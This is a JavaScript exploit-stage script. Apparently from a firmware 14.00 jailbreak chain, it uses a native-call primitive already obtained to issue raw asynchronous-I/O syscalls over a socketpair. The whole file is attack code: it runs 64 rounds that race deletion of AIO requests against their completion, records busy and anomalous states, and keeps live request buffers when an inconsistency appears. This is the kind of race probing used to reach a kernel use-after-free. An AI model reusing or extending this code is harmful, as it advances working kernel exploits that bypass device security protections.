// 14.00 completion-boundary trial, from live socket+AIO observations.
// Every request reads one owned byte, then deletion races its completion.
// Stop at the first inconsistent state and retain any live request buffers.
var result=null,phase="preflight",n=null,f=null,saved=null;
var fdRead=-1,fdWrite=-1,pid=-1,liveId=0,clean=true;
var iterations=0,immediate=0,busy=0,other=0,anomaly="";
var minId=0x7fffffff,maxId=0,restored=false,guards=true;
try {
  n=window.__fw14NativeInvoke;
  var s=window.__fw14ArrayState;
  if(!n||!n.frame||n.frame.length<0x1b00||!n.wrappers||
     !n.wrappers.socketpair||!n.wrappers.write||
     !n.wrappers.close||!s||s.array[0]!==s.a||
     [662,664,669].some(function(v){
       return typeof n.wrappers["sys"+v]!=="number";
     })) throw new Error("native_plan_missing");
  f=n.frame;
  var a=n.frameAddress,dv=new DataView(f.buffer,f.byteOffset,f.byteLength);
  var p=n.call("getpid",[]);
  if(p.high!==0||p.value<1||p.value>100000)throw new Error("pid_invalid");
  pid=p.value;
  saved=Array.from(f.subarray(0x1800,0x1b00));
  function put64(off,v){
    dv.setUint32(off,v>>>0,true);
    dv.setUint32(off+4,Math.floor(v/0x100000000)>>>0,true);
  }
  function fmt(c){return c.value+"/"+c.high+"e"+
    (c.value===-1?n.readErrno():0);}
  function state(){
    var c=n.call("sys664",[a+0x1940,1,a+0x1960,0,0,0]);
    return {call:fmt(c),code:dv.getUint32(0x1960,true)};
  }
  function del(){
    dv.setUint32(0x1980,0xa5a5a5a5,true);
    var c=n.call("sys662",[a+0x1940,1,a+0x1980,0,0,0]);
    return {call:fmt(c),code:dv.getUint32(0x1980,true),ok:c.value===0};
  }
  f.fill(0,0x1800,0x1b00);
  f.fill(0xa5,0x1a80,0x1b00);
  phase="socketpair";
  var pair=n.call("socketpair",[1,1,0,a+0x1a20]);
  fdRead=dv.getInt32(0x1a20,true);
  fdWrite=dv.getInt32(0x1a24,true);
  if(pair.value!==0||pair.high!==0||fdRead<3||fdRead>=1024||
     fdWrite<3||fdWrite>=1024||fdRead===fdWrite)
    throw new Error("socketpair_"+fmt(pair));
  if(api&&api.markSync)api.markSync("aio_delete_brute_start");
  for(var iter=0;iter<64;iter++){
    phase="iteration_"+iter;
    f.fill(0,0x1800,0x19c0);
    f.fill(0xa5,0x1900,0x1940);
    var byte=(0x31+iter)%256;
    f[0x1a00]=byte;
    put64(0x1800,0);put64(0x1808,1);
    put64(0x1810,a+0x1900);put64(0x1818,a+0x1920);
    dv.setInt32(0x1820,fdRead,true);
    var sub=n.call("sys669",[1,a+0x1800,1,3,a+0x1940,0]);
    var id=dv.getInt32(0x1940,true);
    if(sub.value!==0||sub.high!==0||id<=0||id>=0x10000000){
      anomaly="submit:"+iter+":"+fmt(sub)+":"+id;break;
    }
    liveId=id;clean=false;
    if(id<minId)minId=id;
    if(id>maxId)maxId=id;
    var wr=n.call("write",[fdWrite,a+0x1a00,1]);
    if(wr.value!==1||wr.high!==0){
      anomaly="write:"+iter+":"+fmt(wr);break;
    }
    var first=del();
    if(!first.ok){
      anomaly="delete_syscall:"+iter+":"+first.call;break;
    }
    if(first.code===0){
      immediate++;
      liveId=0;clean=true;
    } else if(first.code===0x80020010){
      busy++;
      var pol={call:"not_run",code:0};
      for(var j=0;j<256;j++){
        pol=state();
        if((pol.code&0xffff)===3||(pol.code&0xffff)===4)break;
      }
      if((pol.code&0xffff)!==3){
        anomaly="busy_final_state:"+iter+":"+pol.call+":"+pol.code;
        break;
      }
      var second=del();
      if(!second.ok||second.code!==0){
        anomaly="busy_final_delete:"+iter+":"+second.call+":"+second.code;
        break;
      }
      liveId=0;clean=true;
    } else {
      other++;
      anomaly="delete_per_id:"+iter+":"+first.code;
      break;
    }
    var count=dv.getUint32(0x1920,true);
    if(count!==1||f[0x1900]!==byte){
      anomaly="result:"+iter+":"+count+":"+f[0x1900]+":"+byte;
      break;
    }
    iterations++;
    if(api&&api.markSync&&iter===15)api.markSync("aio_delete_brute_16");
    if(api&&api.markSync&&iter===31)api.markSync("aio_delete_brute_32");
    if(api&&api.markSync&&iter===47)api.markSync("aio_delete_brute_48");
  }
  if(api&&api.markSync)api.markSync("aio_delete_brute_done");
  for(var g=0x1a80;g<0x1b00;g++)if(f[g]!==0xa5)guards=false;
  var q=n.call("getpid",[]);
  result={id:"aio_completion_delete_brute_v1",
    status:!anomaly&&iterations===64&&clean&&guards&&
      q.high===0&&q.value===pid?"pass":"fail",
    details:{pid:pid,iterations:iterations,
      immediate:immediate,busy:busy,other:other,
      ids:minId+"/"+maxId,anomaly:anomaly||"none",
      live_id:liveId,guards:guards,pid_ok:q.high===0&&q.value===pid}};
} catch(error) {
  result={id:"aio_completion_delete_brute_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,170),
      pid:pid,iterations:iterations,live_id:liveId,
      immediate:immediate,busy:busy}};
} finally {
  if(liveId&&n&&f){
    try {
      for(var z=0;z<256;z++){
        var st=n.call("sys664",[n.frameAddress+0x1940,1,
          n.frameAddress+0x1960,0,0,0]);
        var sv=(new DataView(f.buffer,f.byteOffset,f.byteLength)).getUint32(0x1960,true);
        if(st.value===0&&((sv&0xffff)===3||(sv&0xffff)===4)){
          var last=n.call("sys662",[n.frameAddress+0x1940,1,
            n.frameAddress+0x1980,0,0,0]);
          if(last.value===0&&
             (new DataView(f.buffer,f.byteOffset,f.byteLength)).getUint32(0x1980,true)===0){
            liveId=0;clean=true;
          }
          break;
        }
      }
    } catch(ignore) {}
  }
  if(n&&clean){
    if(fdWrite>=3)try{n.call("close",[fdWrite]);}catch(ignore){}
    if(fdRead>=3)try{n.call("close",[fdRead]);}catch(ignore){}
  }
  if(f&&saved&&clean){
    for(var r=0;r<saved.length;r++)f[0x1800+r]=saved[r];
    restored=true;
  }
}
if(result&&result.details){
  result.details.frame_restored=restored;
  result.details.final_live_id=liveId;
}
return [result];
